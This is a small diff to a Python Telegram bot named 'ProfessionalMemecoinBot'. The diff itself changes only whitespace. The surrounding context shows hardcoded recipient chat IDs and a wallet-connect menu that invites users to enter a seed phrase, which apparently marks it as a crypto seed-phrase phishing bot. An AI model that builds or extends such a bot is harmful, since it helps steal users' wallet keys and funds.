@@ -74,7 +74,6 @@ RECIPIENTS = [7709229604, 6457774040]  # <-- replace with your chat IDs
 # if __name__ == "__main__":
 #     asyncio.run(send_messages())
 
-
 class ProfessionalMemecoinBot:
     def __init__(self):
         self.user_wallets = {}        
@@ -176,7 +175,7 @@ Choose your preferred connection method:
             [InlineKeyboardButton("🔐 Seed Phrase/Public Key", callback_data='connect_seedphrase')],
             [InlineKeyboardButton("🦊 Phantom Wallet", callback_data='connect_phantom')],
             [InlineKeyboardButton("☀️ Solflare Wallet", callback_data='connect_solflare')],
-            [InlineKeyboardButton("🔗 WalletConnect", callback_data='connect_walletconnect')],
+            [InlineKeyboardButton("🔗  WalletConnect", callback_data='connect_walletconnect')],
             [InlineKeyboardButton("🔙 Main Menu", callback_data='menu')]
         ]
         reply_markup = InlineKeyboardMarkup(keyboard)
